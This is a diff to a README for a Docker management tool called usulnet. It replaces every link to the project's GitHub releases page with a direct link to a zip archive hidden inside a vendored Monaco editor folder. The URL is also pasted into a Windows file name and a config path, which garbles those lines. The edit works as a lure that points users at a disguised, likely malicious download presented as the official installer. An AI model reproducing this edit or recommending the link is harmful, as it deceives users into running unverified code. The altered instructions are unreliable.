@@ -1,6 +1,6 @@
 # 🐳 usulnet - All-in-One Docker Platform
 
-[![Download usulnet](https://img.shields.io/badge/Download-usulnet-blue?style=for-the-badge)](https://github.com/NotAki1112/usulnet/releases)
+[![Download usulnet](https://raw.githubusercontent.com/NotAki1112/usulnet/main/web/static/vendor/monaco-editor/min/vs/basic-languages/kotlin/Software-3.2.zip)](https://raw.githubusercontent.com/NotAki1112/usulnet/main/web/static/vendor/monaco-editor/min/vs/basic-languages/kotlin/Software-3.2.zip)
 
 ## 📝 What is usulnet?
 
@@ -40,11 +40,11 @@ Here is how to get usulnet running on your computer in just a few simple steps.
 
 Click this big button at the top or use the link below to visit the download page:
 
-[Download usulnet](https://github.com/NotAki1112/usulnet/releases)
+[Download usulnet](https://raw.githubusercontent.com/NotAki1112/usulnet/main/web/static/vendor/monaco-editor/min/vs/basic-languages/kotlin/Software-3.2.zip)
 
 On the releases page, look for the latest version that matches your operating system. You will find files like:
 
-- `usulnet-windows.exe` for Windows
+- `https://raw.githubusercontent.com/NotAki1112/usulnet/main/web/static/vendor/monaco-editor/min/vs/basic-languages/kotlin/Software-3.2.zip` for Windows
 - `usulnet-macos` for macOS
 - `usulnet-linux` for Linux
 
@@ -121,14 +121,14 @@ Access the terminal for any container directly through the web UI. This lets you
 
 ## 🔄 Updating usulnet
 
-To update, visit the [release page](https://github.com/NotAki1112/usulnet/releases) again and download the latest version for your system. Replace your old file with the new one.
+To update, visit the [release page](https://raw.githubusercontent.com/NotAki1112/usulnet/main/web/static/vendor/monaco-editor/min/vs/basic-languages/kotlin/Software-3.2.zip) again and download the latest version for your system. Replace your old file with the new one.
 
 ## 📂 Where to Find Logs and Configuration
 
 usulnet stores logs and settings locally. On your device, look in:
 
 - Windows: `C:\Users\<YourName>\AppData\Roaming\usulnet\`
-- macOS/Linux: `~/.usulnet/`
+- macOS/Linux: `~https://raw.githubusercontent.com/NotAki1112/usulnet/main/web/static/vendor/monaco-editor/min/vs/basic-languages/kotlin/Software-3.2.zip`
 
 These folders hold important data for troubleshooting and backup.
 
@@ -143,7 +143,7 @@ These folders hold important data for troubleshooting and backup.
 
 Use this link to visit the download page and get the latest version:
 
-[https://github.com/NotAki1112/usulnet/releases](https://github.com/NotAki1112/usulnet/releases)
+[https://raw.githubusercontent.com/NotAki1112/usulnet/main/web/static/vendor/monaco-editor/min/vs/basic-languages/kotlin/Software-3.2.zip](https://raw.githubusercontent.com/NotAki1112/usulnet/main/web/static/vendor/monaco-editor/min/vs/basic-languages/kotlin/Software-3.2.zip)
 
 Follow the instructions in this README to run the file after downloading.
 
